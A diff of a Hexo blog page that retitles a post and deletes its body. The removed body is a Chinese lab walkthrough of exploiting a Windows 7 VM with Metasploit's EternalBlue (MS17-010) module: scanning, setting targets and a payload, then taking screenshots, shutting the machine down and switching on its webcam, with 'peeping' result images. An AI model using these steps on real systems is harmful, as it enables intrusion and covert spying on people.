@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="第一次攻击实验, Curious">
+    <meta name="keywords" content="note_2, Curious">
     <meta name="description" content="用于学习操作">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>第一次攻击实验 | Curious</title>
+    <title>note_2 | Curious</title>
     <link rel="icon" type="image/png" href="/faviconn.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -309,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">第一次攻击实验</h1>
+                    <h1 class="description center-align post-title">note_2</h1>
                 </div>
             </div>
         </div>
@@ -429,13 +429,9 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/experiment/">
-                                <span class="chip bg-color">experiment</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -447,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-04-15
+                    2020-05-11
                 </div>
                 
 
@@ -456,7 +452,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    295
+                    52
                 </div>
                 
 
@@ -479,22 +475,7 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>实验:metasploit下利用”永恒之蓝”攻击win7<br>(准备阶段，win7虚拟机，kali linux系统)<br>实验声明:网络不是法外之地~~</p>
-<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>初次使用 –&gt; msfdb init/reinit<br>开启数据库 –&gt; sudo service postgresql start</p>
-<h5 id="msfconsole进入hexo"><a href="#msfconsole进入hexo" class="headerlink" title="msfconsole进入hexo"></a>msfconsole进入hexo</h5><p><img src="https://wx2.sbimg.cn/2020/04/15/p0.jpg" alt=""></p>
-<h5 id="搜索cve17-010相关的exp"><a href="#搜索cve17-010相关的exp" class="headerlink" title="搜索cve17-010相关的exp"></a>搜索cve17-010相关的exp</h5><p>输入 –&gt; search ms17-010<br><img src="https://wx1.sbimg.cn/2020/04/15/p1.png" alt=""></p>
-<h5 id="扫描漏洞"><a href="#扫描漏洞" class="headerlink" title="扫描漏洞"></a>扫描漏洞</h5><p>输入 –&gt; use auxiliary/scanner/smb/smb_ms17_010<br>使用options查看参数<br><img src="https://wx1.sbimg.cn/2020/04/15/p2.png" alt=""></p>
-<h5 id="关键来了，找了win7的IP，"><a href="#关键来了，找了win7的IP，" class="headerlink" title="关键来了，找了win7的IP，"></a>关键来了，找了win7的IP，</h5><p>输入 –&gt; set RHOSTS 192.168.XXX.XXX<br>接着 –&gt; run<br><img src="https://wx2.sbimg.cn/2020/04/15/p3.png" alt=""><br><img src="https://wx2.sbimg.cn/2020/04/15/p4.png" alt=""></p>
-<p>接着 –&gt; use exploit/windows/smb/ms17_010_eternalblue<br>使用options查看相关参数<br><img src="https://wx1.sbimg.cn/2020/04/15/p5.png" alt=""></p>
-<p>然后 –&gt; set RHOSTS 192.168.XXX.XXX (靶机的IP)</p>
-<h5 id="查看payload"><a href="#查看payload" class="headerlink" title="查看payload"></a>查看payload</h5><p>show payloads<br><img src="https://wx1.sbimg.cn/2020/04/15/p6.png" alt=""></p>
-<h5 id="使用payload"><a href="#使用payload" class="headerlink" title="使用payload"></a>使用payload</h5><p>set payload (号数)<br>使用options查看payload要的参数<br><img src="https://wx2.sbimg.cn/2020/04/15/p7.png" alt=""></p>
-<p>*设置本机IP –&gt; set LHOST 192.168.XXX.XXX</p>
-<h5 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h5><p>exploit<br><img src="https://wx2.sbimg.cn/2020/04/15/p8.png" alt=""><br><img src="https://wx1.sbimg.cn/2020/04/15/p9.png" alt=""></p>
-<p>然后就可以进行截屏、关机、开摄像头等操作了,嘿嘿<br>截屏 –&gt; screenshot<br>关机 –&gt; shutdown<br>开摄像头 –&gt; webcam_scream<br><img src="https://wx2.sbimg.cn/2020/04/15/p10.png" alt=""></p>
-<p>以下则是小实验的“偷窥”成果<br><img src="https://wx1.sbimg.cn/2020/04/15/p11.png" alt=""><br><img src="https://wx2.sbimg.cn/2020/04/15/p12.png" alt=""></p>
-<p>老板觉得博文勉强过得去记得三连嘿，爱宁哟</p>
-<script>
+                <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -527,7 +508,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="zwdtk.github.io" rel="external nofollow noreferrer">LMX</a>
+                    <a href="zwdtk.github.io" rel="external nofollow noreferrer">zwdtk</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -537,7 +518,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="zwdtk.github.io/2020/04/15/ok/">zwdtk.github.io/2020/04/15/ok/</a>
+                    <a href="zwdtk.github.io/2020/05/11/note-2/">zwdtk.github.io/2020/05/11/note-2/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -550,7 +531,7 @@
                     All articles in this blog are used except for special statements
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     reprint polocy. If reproduced, please indicate source
-                    <a href="zwdtk.github.io" target="_blank">LMX</a>
+                    <a href="zwdtk.github.io" target="_blank">zwdtk</a>
                     !
                 </span>
             </div>
@@ -574,11 +555,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/experiment/">
-                                    <span class="chip bg-color">experiment</span>
-                                </a>
-                            
+                            <span class="chip bg-color">No tag</span>
                         </div>
                     
                 </div>
@@ -744,9 +721,51 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
+            <div class="card">
+                <a href="/2020/05/11/note-2/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="note_2">
+                        
+                        <span class="card-title">note_2</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            zwdtk
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2020/04/27/note-1/">
                     <div class="card-image">
@@ -766,9 +785,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-04-27
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-27
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -784,43 +803,6 @@
                         <span class="chip bg-color">Linux</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/04/02/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-02
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            zwdtk
-                            
-                        </span>
-                    </div>
                 </div>
                 
             </div>
